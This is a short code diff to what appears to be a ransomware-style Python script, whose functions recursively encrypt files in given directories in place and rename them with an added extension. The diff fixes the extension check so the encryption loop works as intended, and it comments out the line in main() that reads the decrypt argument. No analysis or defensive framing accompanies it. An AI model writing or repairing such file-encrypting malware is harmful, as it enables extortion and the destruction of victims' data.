@@ -138,7 +138,7 @@ def encrypt_files(crypt, start_dirs):  # TODO: include within function to dynami
     for curr_dir in start_dirs:
         for file in discover_files(curr_dir):
             # TODO: implement encryption bursts based on current config, consider config change
-            if os.path.splitext(file) != EXTENSION:
+            if not file.endswith(EXTENSION):
                 modify_file_inplace(file, crypt.encrypt)
                 os.rename(file, file + EXTENSION)
                 print("File changed from " + file + " to " + file + EXTENSION)
@@ -148,7 +148,7 @@ def decrypt_files(crypt, start_dirs):
     # Recursively go through folders and decrypt files
     for curr_dir in start_dirs:
         for file in discover_files(curr_dir):
-            if os.path.splitext(file) == EXTENSION:
+            if file.endswith(EXTENSION):
                 # do not use double encrypt for decrypt (might work with this setup, but not guaranteed)
                 modify_file_inplace(file, crypt.decrypt)
                 file_original = os.path.splitext(file)[0]
@@ -192,7 +192,7 @@ def main():
     # Parse arguments
     args = parse_args()
     encrypt = args.encrypt
-    decrypt = args.decrypt
+    # decrypt = args.decrypt
 
     absolute_paths = str(args.path)
 
